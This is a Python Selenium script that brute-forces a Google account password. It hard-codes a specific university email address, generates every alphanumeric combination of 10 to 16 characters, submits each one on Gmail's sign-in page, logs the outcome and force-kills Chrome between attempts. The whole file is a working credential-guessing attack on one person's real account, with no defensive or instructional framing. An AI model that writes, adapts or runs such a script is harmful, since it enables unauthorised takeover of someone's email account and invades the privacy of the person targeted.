from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import NoSuchElementException
import time
import logging
import itertools
import string
import subprocess
 
# Create and configure logger
logging.basicConfig(filename="F:/chromedriver_win32/logs/newfile.log",
                    format='%(asctime)s %(message)s',
                    filemode='w+')

# Creating an object
logger = logging.getLogger()
 
# Setting the threshold of logger to INFO
logger.setLevel(logging.INFO)

# Step 1- Start Chrome in debug mode
chromedata = 'F:/chromedata'
chromeDriverManager = 'F:/chromedriver_win32/chromedriver.exe'

# chrome.exe –remote-debugging-port=9222 –user-data-dir="F:\chromeData"
# chrome.exe –remote-debugging-port=9222 –user-data-dir="F:\chromeData" --remote-allow-origins=*
# path = 'C:/Program Files/Google/Chrome/Application'
characters = string.ascii_letters + string.digits  + '@'
length = 17
command = 'chrome.exe -remote-debugging-port=9222 -user-data-dir="F:\chromeData" --remote-allow-origins=*'

def start_proces(password):
    # chrome_options = Options()
    # print('waiting for user to open chrome 0')

    # chrome_options.add_experimental_option('debuggerAddress', 'localhost:9222')
    # print('waiting for user to open chrome 1')
    
    # ser = Service(chromeDriverManager)
    # print('waiting for user to open chrome 2')
    
    # try:
    #     result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # except Exception as e:
    #     print("Exception" , str(e))
    # finally:
    #     print('opened chrome')

    # print('waiting for user to open chrome 3')
    
    # try:
    #     driver = webdriver.Chrome(service=ser, options=chrome_options)
    # except Exception as e:
    #     print('run webdriver in chrome')

    # print('waiting for user to open chrome 4')
    # result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # # result = subprocess.run(['sudo', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # print('waiting for user to open chrome 5')

    # # Initialize the webdriver and open a website
    driver = webdriver.Chrome()
    try:
        driver.get("https://accounts.google.com/signin/v2/challenge/pwd?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Ftab%3Drm%26ogbl&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Ftab%3Drm%26ogbl&osid=1&passive=1209600&service=mail&ifkv=AQMjQ7RLPsVdmPI163VdIU6mSwkOCcHiTVqRqmv881UgmqTuY34b3RXME5itDHYUNYX6pJBlCMFI&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&TL=ADBc5UNwsbNIX5kFPvkb_Wfd4PRBT1JpyhNTtbbUFOq5G3mUt35SjxQmCdjfO5xY")
    except NoSuchElementException as e:
        logger.error('Could not load the log in page - ' + password)
        print('Could not load the log in page - ' + password)
        driver.close()
        return
    except Exception as e:
        logger.error('Could not load the log in page (Excpetion) - ' + password)
        print('Could not load the log in page (Excpetion) - ' + password)
        driver.close()
        return

    time.sleep(4)

    try:
        input_field = driver.find_element("xpath", '//*[@id="view_container"]/div/div/div[2]/div/div[1]/div/form/span/section/div/div/div/div/ul/li[1]/div/div[1]/div/div[2]/div[1]')
        input_field.click()
    except NoSuchElementException as e:
        logger.error('Select mail from list - ' + password)
        print('Select mail from list - ' + password)
    except Exception as e:
        logger.error('Select mail from list (Excpetion) - ' + password)
        print('Select mail from list (Excpetion) - ' + password)

    # Find the input field element and enter data
    try:
        input_field = driver.find_element("xpath", '//*[@id="identifierId"]')
        # input_field.send_keys("180303105323@paruluniversity.ac.in")
        input_field.clear()
        input_field.send_keys("180303105323@paruluniversity.ac.in")
        input_field.clear()
        input_field.send_keys("180303105323@paruluniversity.ac.in")
    except NoSuchElementException as e:
        logger.error('Skip email entry - ' + password)
        print('Skip email entry - ' + password)
    except Exception as e:
        logger.error('Skip email entry (Excpetion) - ' + password)
        print('Skip email entry (Excpetion) - ' + password)
    else:
        input_field = driver.find_element("xpath", '//*[@id="identifierNext"]/div/button/span')
        input_field.click()

    # wait for passsword screen to come
    time.sleep(4)

    try:
        input_field = driver.find_element("xpath", '//*[@id="password"]/div[1]/div/div[1]/input')
        input_field.send_keys(password)

        time.sleep(4)

        # Press the "Enter" key
        input_field = driver.find_element("xpath", '//*[@id="passwordNext"]/div/button/span')
        input_field.click()
    except NoSuchElementException as e:
        logger.error('blocked - ' + password)
        print('blocked - ' + password)
        driver.close()
        return
    except Exception as e:
        logger.error('blocked (Excpetion) - ' + password)
        print('blocked (Excpetion) - ' + password)
        # driver.close()
        return

    # wait for passsword screen to come
    time.sleep(4)

    try:
        input_field = driver.find_element("xpath", '//*[@id="yDmH0d"]/c-wiz/div/div[2]/div/div[1]/div/form/span/section[2]/div/div/section/div/div/section/header/div/h2/span')
    except NoSuchElementException as e:
        logger.error('Wrong Password (NoSuchelementException) - ' + password)
        print('Wrong Password (NoSuchelementException) - ' + password)
        driver.close()
        return
    except Exception as e:
        logger.error('Wrong Password (Excpetion) - ' + password)
        print('Wrong Password (Excpetion) - ' + password)
        driver.close()
        return
    else:
        print('Success at last - ' + password)
        driver.close()
        exit()

    # Close the webdriver
    driver.close()

for i in range(10, length):
    for combination in itertools.product(characters, repeat=i):
        subprocess.run('taskkill /F /IM "chrome.exe" /T', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        password = ''.join(combination)
        print(password)
        start_proces(password)
        subprocess.run('taskkill /F /IM "chrome.exe" /T', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        